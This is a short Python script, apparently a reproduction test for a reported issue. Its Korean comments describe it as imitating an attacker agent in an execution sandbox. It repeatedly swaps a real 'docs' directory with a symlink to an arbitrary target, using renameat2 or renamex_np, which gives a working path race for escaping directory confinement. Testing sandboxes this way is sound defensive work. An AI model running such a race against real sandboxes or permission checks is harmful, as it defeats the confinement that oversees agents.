# #359 재현의 공격자 흉내다. 실행 공간의 에이전트가 셸에서 할 수 있는 일이다.
# <owner>/docs(진짜 디렉터리)와 <owner>/docs-link(<target> 을 가리키는 링크)를 원자적으로 맞바꾼다.
# Linux 는 renameat2(RENAME_EXCHANGE), macOS 는 renamex_np(RENAME_SWAP) 이다. 표준 입력이 닫히면 끝난다.
# 인자: <owner dir> <target dir>
import ctypes, ctypes.util, os, sys, platform
owner, target = sys.argv[1], sys.argv[2]
libc = ctypes.CDLL(ctypes.util.find_library("c") or None, use_errno=True)
a = os.path.join(owner, "docs").encode(); b = os.path.join(owner, "docs-link").encode()
if os.path.lexists(b): os.unlink(b)
os.symlink(target, b)
if platform.system() == "Darwin":
    def swap(): return libc.renamex_np(a, b, 0x2)
else:
    AT_FDCWD = -100
    def swap(): return libc.syscall(316 if platform.machine()=="x86_64" else 276, AT_FDCWD, a, AT_FDCWD, b, 2)
import threading
stop = threading.Event()
threading.Thread(target=lambda: (sys.stdin.read(), stop.set()), daemon=True).start()
n = 0
while not stop.is_set():
    if swap() != 0: raise OSError(ctypes.get_errno(), "swap")
    if swap() != 0: raise OSError(ctypes.get_errno(), "swap back")
    n += 1
os.unlink(b)
print(n, flush=True)
